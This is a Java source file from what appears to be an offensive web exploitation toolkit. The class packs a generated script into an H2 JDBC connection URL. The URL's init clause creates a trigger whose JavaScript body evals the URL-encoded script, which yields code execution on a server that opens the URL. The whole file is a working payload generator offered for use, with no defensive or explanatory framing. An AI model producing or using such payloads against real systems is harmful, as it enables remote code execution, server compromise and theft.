package com.reajason.javaweb.packer.h2;

import com.reajason.javaweb.packer.ClassPackerConfig;
import com.reajason.javaweb.packer.Packer;
import com.reajason.javaweb.packer.PackerMeta;
import com.reajason.javaweb.packer.Packers;
import com.reajason.javaweb.packer.scriptengine.ScriptEnginePacker;
import lombok.SneakyThrows;
import org.kohsuke.MetaInfServices;

import java.net.URLEncoder;

/**
 * @author ReaJason
 * @since 2025/6/28
 */
@MetaInfServices(Packer.class)
@PackerMeta(name = Packers.H2JSURLEncode, parent = Packers.H2, order = 2830)
public class H2JSURLEncodePacker implements Packer {
    String template = "jdbc:h2:mem:a;init=CREATE TRIGGER a BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\neval(decodeURIComponent('{{script}}'))$$";

    @SneakyThrows
    @Override
    public String pack(ClassPackerConfig config) {
        String script = new ScriptEnginePacker().pack(config);
        String encode = URLEncoder.encode(script, "UTF-8")
                .replace("+", "%20")
                .replace("%28", "(")
                .replace("%29", ")");
        return template.replace("{{script}}", encode);
    }
}
